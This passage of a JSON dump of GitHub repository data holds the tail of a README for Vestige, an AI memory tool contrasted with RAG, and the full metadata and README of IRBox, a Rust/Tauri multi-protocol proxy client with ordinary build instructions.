already knows about the fix.\n\n---\n\n## Why Not Just Use RAG?\n\nRAG is a dumb bucket. Vestige is an active organ.\n\n| | RAG / Vector Store | Vestige |\n|---|---|---|\n| **Storage** | Store everything, retrieve everything | **Prediction Error Gating** ‚Äî only stores what's surprising or new |\n| **Retrieval** | Nearest-neighbor similarity | **Spreading activation** ‚Äî finds related memories through association chains |\n| **Decay** | Nothing ever expires | **FSRS-6** ‚Äî memories fade like yours do, keeping context lean |\n| **Duplicates** | Manual dedup or none | **Self-healing** ‚Äî automatically merges \"likes dark mode\" + \"prefers dark themes\" |\n| **Importance** | All memories are equal | **Synaptic tagging** ‚Äî retroactively strengthens memories that turn out to matter |\n| **Privacy** | Usually cloud-dependent | **100% local** ‚Äî your data never leaves your machine |\n\n---\n\n## The Cognitive Science Stack\n\nThis isn't a key-value store with an embedding model bolted on. Vestige implements real neuroscience:\n\n**Prediction Error Gating** ‚Äî The bouncer for your brain. When new information arrives, Vestige compares it against existing memories. Redundant? Merged. Contradictory? Superseded. Novel? Stored. Just like the hippocampus.\n\n**FSRS-6 Spaced Repetition** ‚Äî 21 parameters governing the mathematics of forgetting. Frequently-used memories stay strong. Unused memories naturally decay. Your context window stays clean.\n\n**Synaptic Tagging** ‚Äî A memory that seemed trivial this morning can be retroactively tagged as critical tonight. Based on [Frey & Morris, 1997](https://doi.org/10.1038/385533a0).\n\n**Spreading Activation** ‚Äî Search for \"auth bug\" and find the related memory about the JWT library update you saved last week. Memories form a graph, not a flat list. Based on [Collins & Loftus, 1975](https://doi.org/10.1037/0033-295X.82.6.407).\n\n**Dual-Strength Model** ‚Äî Every memory has two values: storage strength (ho",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:31.631732"
  },
  {
    "basic_info": {
      "name": "IRBox",
      "full_name": "frank-vpl/IRBox",
      "owner": "frank-vpl",
      "description": "A versatile proxy client supporting multiple protocols including VLESS, VMess, Shadowsocks, Trojan, Hysteria2, and TUIC with advanced management features, subscription support, routing rules, and system proxy/TUN modes",
      "url": "https://github.com/frank-vpl/IRBox",
      "clone_url": "https://github.com/frank-vpl/IRBox.git",
      "ssh_url": "git@github.com:frank-vpl/IRBox.git",
      "homepage": "https://github.com/frank-vpl/IRBox/discussions",
      "created_at": "2026-02-15T14:48:54Z",
      "updated_at": "2026-02-20T03:25:57Z",
      "pushed_at": "2026-02-18T22:13:10Z"
    },
    "stats": {
      "stars": 342,
      "forks": 19,
      "watchers": 342,
      "open_issues": 6,
      "size": 8286
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 186761,
        "TypeScript": 108741,
        "CSS": 45498,
        "Batchfile": 8501,
        "Shell": 5673,
        "NSIS": 416,
        "HTML": 276
      },
      "license": "GNU General Public License v3.0",
      "topics": []
    },
    "content": {
      "readme": "<div align=\"center\">\n\n# üåê IRBox Client\n\n![IRBox Screenshot](screenshot.png)\n\n**A versatile and secure proxy client built with modern technologies to provide seamless and reliable internet connectivity**\n\nDesigned for privacy-conscious users, IRBox offers multi-protocol support, advanced routing capabilities, and intuitive management tools to ensure a smooth and secure browsing experience.\n\n[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE) \n[![Releases](https://img.shields.io/github/downloads/frank-vpl/IRBox/total.svg)](https://github.com/frank-vpl/IRBox/releases/latest)\n[![Latest Release](https://img.shields.io/github/v/release/frank-vpl/IRBox)](https://github.com/frank-vpl/IRBox/releases/latest)\n\n[Farsi Version](README_FA.md)\n\n</div>\n\n## üöÄ Key Features\n\n### Multi-Protocol Support\n- **VLESS**\n- **VMess**\n- **Shadowsocks**\n- **Trojan**\n- **Hysteria2**\n- **TUIC**\n- **SSH**\n- **WireGuard**\n\n### Advanced Management\n- **Subscription Support** - Import and auto-update subscription URLs\n- **Routing Rules** - Domain-based rules (proxy/direct/block) with presets for ad blocking and regional bypass\n- **Split Tunneling** - Choose default route: proxy all traffic or selected domains\n\n### Connection Modes\n- **System Proxy** - HTTP proxy for system-wide access\n- **TUN Mode** - Full VPN capturing all traffic\n- **Admin Elevation** - One-click \"Run as Administrator\" for TUN mode\n\n### User Experience\n- **Onboarding** - Interactive guided tour for first-time users\n- **TCP Ping** - Bulk server latency testing\n- **Auto-select Best Server** - Intelligent server selection\n- **Themes** - 2 color themes (Dark, Light)\n- **Styles** - Default, Minimal\n\n## üéÅ Gift: Free Xray / sing-box Configs\n\nAs a small gift to the community, IRBox provides a **free public subscription** compatible with **Xray** and **sing-box** clients.\n\nüîó **Subscription URL:**\n```\nhttps://raw.githubusercontent.com/frank-vpl/servers/refs/heads/main/irbox\n```\n\n## üõ†Ô∏è Installation\n\n### Prerequisites\n- Rust and Cargo\n- Tauri CLI\n- NodeJS and NPM \n- Tauri prerequisites\n\n### Quick Setup\n\n1. **Clone the repository**\n   ```bash\n   git clone https://github.com/frank-vpl/IRBox.git\n   cd IRBox\n   ```\n\n2. **Install dependencies**\n   ```bash\n   npm install\n   ```\n   \n3. **Install Tauri CLI**\n   ```bash\n   cargo install tauri-cli --version ^2\n   ```\n\n4. **Download cores**\n\n   **Windows:**\n   ```bash\n   ./cores.bat\n   ```\n   \n   **Linux/macOS:**\n   ```bash\n   chmod +x cores.sh\n   ./cores.sh\n   ```\n\n## üöÄ Usage\n\n### Development\n```bash\ncargo tauri dev\n```\n\n### Production\n```bash\ncargo tauri build\n```\n\n## ü§ù Contributing\n\nContributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.\n\n## üìÑ License\n\nThis project is licensed under the GNU General Public License v3.0 (GPL-3.0) - see the [LICENSE](LICENSE) file for details.\n\n### Core Technologies\n\nIRBox leverages the power of two leading proxy technologies:\n\n<div align=\"center\">\n\n| Core | Description |\n|------|-------------|\n| [Xray-core](https://github.com/XTLS/Xray-core) | A platform for building proxies to bypass network restrictions |\n| [sing-box](https://github.com/SagerNet/sing-box) | The universal proxy platform |\n\n</div>\n\n### Licenses of Third-Party Libraries\n\n- [Rust](https://www.rust-lang.org/) - [License](./licenses/rust.md)\n- [Tauri](https://v2.tauri.app/) - [License](./licenses/tauri.md)\n- [sing-box](https://github.com/SagerNet/sing-box) - [License](./licenses/sing-box.md)\n- [Xray-core](https://github.com/XTLS/Xray-core) - [License](./licenses/xray.md)\n\n## üôè Acknowledgments\n\n- Built with [Tauri](https://tauri.app/) - Framework for building secure native apps\n- Powered by [sing-box](https://github.com/SagerNet/sing-box) and [Xray-core](https://github.com/XTLS/Xray-core)\n- Inspired by the need for secure and flexible VPN solutions\n\n## üìö Documentation\n[IRBox Documentation](./docs/README.md)\n\n## üé® Design Assets\n\n<div align=\"center\">\n\n### App Logo & Icons\n![PiraIcons](https://img.shields.io/badge/Icons_by-Hossein_Pira-3d85c6?style=for-the-badge&logo=github)\n\n- Icons by Hossein Pira ‚Äì [PiraIcons](https://github.com/code3-dev/piraicons-assets) - [License](./licenses/piraicons.md)\n\n</div>\n\n## üß© Technologies Used\n\n<div align=\"center\">\n\n### Frontend Dependencies\n![React](https://img.shields.io/badge/React-20232a?style=for-the-badge&logo=react&logoColor=61DAFB)\n![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)\n![Vite](https://img.shields.io/badge/Vite-B73BFE?style=for-the-badge&logo=vite&logoColor=FFD62E)\n\n### Framework & Core\n![Tauri](https://img.shields.io/badge/Tauri-FFD62E?style=for-the-badge&logo=tauri&logoColor=black)\n![Rust](https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white)\n\n</div>\n\n### Dependencies\n- [react](https://react.dev/) - A JavaScript library for building user interfaces\n- [react-dom](https://rea",
      "default_branch": "master"
    },
    "fetched_at": "2026-02-20T03:28:32.809381"
  }
]